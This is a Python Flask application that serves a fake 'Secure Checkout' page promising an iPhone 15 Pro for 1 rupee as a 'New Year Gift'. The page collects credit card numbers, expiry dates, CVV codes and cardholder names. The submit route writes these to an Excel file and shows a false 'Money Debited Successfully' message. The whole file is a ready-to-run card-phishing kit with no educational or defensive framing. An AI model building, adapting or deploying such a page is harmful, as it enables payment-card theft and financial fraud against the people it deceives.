from flask import Flask, request, render_template_string
import pandas as pd

app = Flask(__name__)

# Integrated HTML template with product details and form
html_template = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Checkout</title>
<style>
 *,
*:after,
*:before {
    box-sizing: border-box;
}

ul {
    padding-left: 20px;
}

body {
    font-family: "Arial", sans-serif;
    color: #333;
    line-height: 1.6;
    margin: 0;
    background-color: #fafafa;
}

a {
    color: #007bff;
    text-decoration: none;
}

.content {
    z-index: 9999;
    max-width: 960px;
    margin: 20px auto;
    padding: 20px;
    background: white;
    border-radius: 10px;
    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
}

.secure, .backBtn {
    display: flex;
    align-items: center;
    justify-content: center;
}

.secure span, .backBtn span {
    margin-left: 5px;
}

.backBtn {
    margin-top: 20px;
}

.secure {
    color: #6c757d;
    align-items: center;
}

.secure .icon, .logo .icon {
    font-size: 24px;
    margin-right: 10px;
}

.logo {
    font-size: 24px;
    font-weight: bold;
    text-align: center;
    margin: 20px 0;
}

.img-container img {
    max-width: 100%;
    height: auto;
    border-radius: 8px;
}

.details {
    display: flex;
    flex-direction: column;
    margin-bottom: 20px;
}

.details__item {
    display: flex;
    margin-bottom: 15px;
}

.item__image {
    flex: 1;
    text-align: center;
}

.item__details {
    flex: 2;
    padding: 20px;
}

.item__title {
    font-size: 22px;
    font-weight: 600;
    margin-bottom: 10px;
}

.item__price {
    font-size: 18px;
    color: #28a745;
    margin-bottom: 10px;
}

.notification {
    text-align: center;
    font-size: 20px;
    font-weight: 600;
    margin: 20px 0;
}

.payment {
    padding: 20px;
    background: #fff;
    border-radius: 8px;
    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
}

.payment__title {
    font-size: 18px;
    margin-bottom: 15px;
}

.btn {
    display: inline-block;
    background: #007bff;
    color: white;
    padding: 15px 25px;
    border-radius: 10px;


    text-transform: Capitalise;
    font-weight: bold;
    text-align: center;
    text-decoration: none;
    transition: background-color 0.3s ease;
}
.item__image {
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 20px; /* Added padding for better spacing */
}

.item__image img {
    max-width: 100%;  /* Ensures image is responsive and fits its container */
    height: auto;     /* Maintains the aspect ratio of the image */
    max-height: 300px; /* You can adjust this value to fit your design */
}


.btn:hover {
    background-color: #0056b3;
}

.input, .ddl {
    width: 100%;
    padding: 10px;
    border: 1px solid #ced4da;
    border-radius: 4px;
    margin-bottom: 10px;
}

.field {
    margin-bottom: 15px;
}

</style>
</head>
<body>
    <header>
        <div class="container">
            <div class="navigation">
                <div class="logo">
                    <i class="icon icon-basket"></i>New Year Gift 🎁
                </div>
                <div class="secure">
                    <i class="icon icon-shield"></i>
                    <span>Secure Checkout</span>
                </div>
            </div>
            <div class="notification">
                Complete Your 1₹ Payment and Get your Iphone
            </div>
        </div>
    </header>
    <section class="content">
        <form method="post" action="/submit">
            <div class="details shadow">
                <div class="details__item">
                    <div class="item__image">
                        <img class="iphone" src="https://media.ldlc.com/r1600/ld/products/00/06/06/41/LD0006064109.jpg" alt="Iphone X">
                    </div>
                    <div class="item__details">
                        <div class="item__title">Iphone 15Pro</div>
                        <div class="item__price">₹1</div>
                        <div class="item__quantity">Quantity: 1</div>
                        <div class="item__description">
                            <ul>
                                <li>Super fast and power efficient</li>
                                <li>A lot of fast memory</li>
                                <li>High resolution camera</li>
                                <li>Smart tools for health and traveling and more</li>
                                <li>Share your games and achievements with your friends via Group Play</li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
            <div class="payment">
                <!-- Payment Form -->
                <div class="payment__title">Payment Method</div>
                <div class="payment__info">
                    <div class="payment__cc">
                        <div class="payment__title"><i class="icon icon-user"></i>Personal Information</div>
                         <div class="field">
                                <label for="cardNum">Credit Card Number</label>
                                <input type="text" class="input txt text-validated" id="cardNum" name="card_number" pattern="\d{4} ?\d{4} ?\d{4} ?\d{4}" required />

                            </div>
                            <!-- Expiry Date -->
                            <div class="field small">
                                <label>Expiry Date</label>
                                <select class="input ddl" name="expiry_month">
                                 <option selected>01</option>
                          <option>02</option>
                          <option>03</option>
                          <option>04</option>
                          <option>05</option>
                          <option>06</option>
                          <option>07</option>
                          <option>08</option>
                          <option>09</option>
                          <option>10</option>
                          <option>11</option>
                          <option>12</option>
                        </select>
        
                                <select class="input ddl" name="expiry_year">
                                 <option>23</option>
                          <option>24</option>
                          <option>25</option>
                          <option selected>26</option>
                          <option>27</option>
                          <option>28</option>
                          <option>29</option>
                          <option>30</option>
                        </select>

                            </div>
                            <!-- CVV Code -->
                            <div class="field small">
                                <label for="cvv">CVV Code</label>
                                <input type="text" class="input txt" id="cvv" name="cvv" pattern="\d{3,4}" required />
                            </div>
                            <!-- Name on Card -->
                            <div class="field">
                                <label for="holderName">Name on Card</label>
                                <input type="text" class="input txt" id="holderName" name="name_on_card" required />
                            </div>
                        </div>
                    </div>
                </div>
                <div class="row">
                    <button type="submit" class="btn">Submit Details</button>
                </div>
            </div>
        </form>
    </section>
</body>
</html>
"""
@app.route('/', methods=['GET'])
def form():
    # Display the form
    return render_template_string(html_template)

@app.route('/submit', methods=['POST'])
def submit():
    # Extracting data from the form
    data = {
        'Credit Card Number': request.form.get('card_number'),
        'Expiry Date Month': request.form.get('expiry_month'),
        'Expiry Date Year': request.form.get('expiry_year'),
        'CVV Code': request.form.get('cvv'),
        'Name on Card': request.form.get('name_on_card'),
    }

    # Create a DataFrame and save it as an Excel file
    df = pd.DataFrame([data])
    df.to_excel('submission_data.xlsx', index=False)

    return 'Money Debited Successfully'

if __name__ == '__main__':
    app.run(debug=True)
